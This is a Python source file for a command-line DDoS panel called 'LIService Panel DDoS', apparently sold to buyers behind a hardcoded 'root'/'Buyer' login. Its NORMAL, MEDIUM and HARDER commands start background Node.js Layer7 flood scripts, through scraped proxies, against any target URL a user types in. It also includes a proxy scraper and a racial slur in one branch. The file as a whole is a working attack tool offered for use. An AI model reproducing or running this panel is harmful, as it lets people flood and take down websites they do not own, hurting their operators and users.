import os
import sys
import getpass
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def logo():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | MAIN MENU \x07")
	print(""" 

                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝

 """)
def methods():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | LIST METHODS \x07")
	print("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝

 • NORMAL | Suitable for regular sites | Layer7
 • MEDIUM | Usually sites with continuous protection are used | Layer7
 • HARDER | Big request. Suitable for big site attacks | Layer7
 • PROXY  | Proxies grab Or proxies scrape | Tools
 • STOP   | Stoping all attack | Tools
 • CREDIT | Credits panel D.D.o.S | Tools
 • SETUP  | Setup panel ddos| Tools 

""")

def main():
    logo()
    while(True):
        cnc = input('''Panel•DDoS[LIService]-> ''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "HELP" or cnc == "help" or cnc == "Help" or cnc == "HLP":
            methods()
        elif cnc == "stop" or cnc == "STOP" or cnc == "Stop" or cnc == "stp":
            os.system('pkill -f "LIService-Destroyer.js"')
            os.system('pkill -f "LIService-HTTPS.js"')
            os.system('pkill -f "LIService-Raw.js"')
            os.system('pkill -f "LIService-Method.js"')
            os.system('pkill -f "LIService-TLS.js"')
            os.system('pkill -f "LIService-HTTPS-Z.js"')
            os.system('pkill -f "LIService-HTTPS-2.js"')
            os.system('pkill -f "LIService-HTTPS-3.js"')
            os.system('pkill -f "LIService-HTX-2.js"')
            os.system('pkill -f "LIService-X.js"')
            print("Stops All Attacks")
        elif cnc == "setup" or cnc == "Setup" or cnc == "SETUP" or cnc == "SET":
            os.system("python3 installer.py")
            print("Done")
        elif cnc == "Proxy" or cnc == "proxy" or cnc == "PROXY" or cnc == "PX":
            os.system(f'cd Layer7 && python3 LIService-Scrape.py')
            print("Done")
        elif cnc == "stop" or cnc == "STOP" or cnc == "Stop" or cnc == "stp":
        	print(""" 

                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝


LIService Panel DDoS Credits
Create By @Lintar21 

Telegram: t.me/Lintar21
 """)

        elif "NORMAL" in cnc:
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'nohup node Layer7/LIService-Destroyer.js GET {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Raw.js {host} {attack_time} > /dev/null 2>&1 &')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: NORMAL
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill -f "LIService-Destroyer.js"')
                os.system('pkill -f "LIService-Raw.js"')
            except IndexError:
                print('Usage: NORMAL <url> <time>')
                print('Example: NORMAL http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "MEDIUM" in cnc:
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'nohup node Layer7/LIService-Destroyer.js GET {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS-2.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS-Z.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-X.js {host} {attack_time} 8 8 proxy.txt ipv4 > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-TLS.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Raw.js {host} {attack_time} > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Method.js {host} {attack_time} > /dev/null 2>&1 &')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: MEDIUM
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill -f "LIService-Destroyer.js"')
                os.system('pkill -f "LIService-HTTPS.js"')
                os.system('pkill -f "LIService-Raw.js"')
                os.system('pkill -f "LIService-Method.js"')
                os.system('pkill -f "LIService-TLS.js"')
                os.system('pkill -f "LIService-HTTPS-Z.js"')
                os.system('pkill -f "LIService-HTTPS-2.js"')
                os.system('pkill -f "LIService-X.js"')
            except IndexError:
                print('Usage: MEDIUM <url> <time>')
                print('Example: MEDIUM http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "HARDER" in cnc:
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'nohup node Layer7/LIService-Destroyer.js GET {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Destroyer.js POST {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS-3.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTX.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS-2.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-HTTPS-Z.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-X.js {host} {attack_time} 8 8 proxy.txt ipv4 > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-TLS.js {host} {attack_time} 8 8 proxy.txt > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Raw.js {host} {attack_time} > /dev/null 2>&1 &')
                os.system(f'nohup node Layer7/LIService-Method.js {host} {attack_time} > /dev/null 2>&1 &')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: HARDER
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill -f "LIService-Destroyer.js"')
                os.system('pkill -f "LIService-HTTPS.js"')
                os.system('pkill -f "LIService-Raw.js"')
                os.system('pkill -f "LIService-Method.js"')
                os.system('pkill -f "LIService-TLS.js"')
                os.system('pkill -f "LIService-HTTPS-Z.js"')
                os.system('pkill -f "LIService-HTTPS-2.js"')
                os.system('pkill -f "LIService-HTTPS-3.js"')
                os.system('pkill -f "LIService-HTX-2.js"')
                os.system('pkill -f "LIService-X.js"')
            except IndexError:
                print('Usage: HARDER <url> <time>')
                print('Example: HARDER http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "Niga" in cnc:
            print(f'''
Are you niga?
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
            except IndexError:
                pass

def login():
    clear()
    user = "root"
    passwd = "Buyer"
    username = input("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
              
Username: """)
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password/username you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to LIService Bro")
        clear()
        main()

login()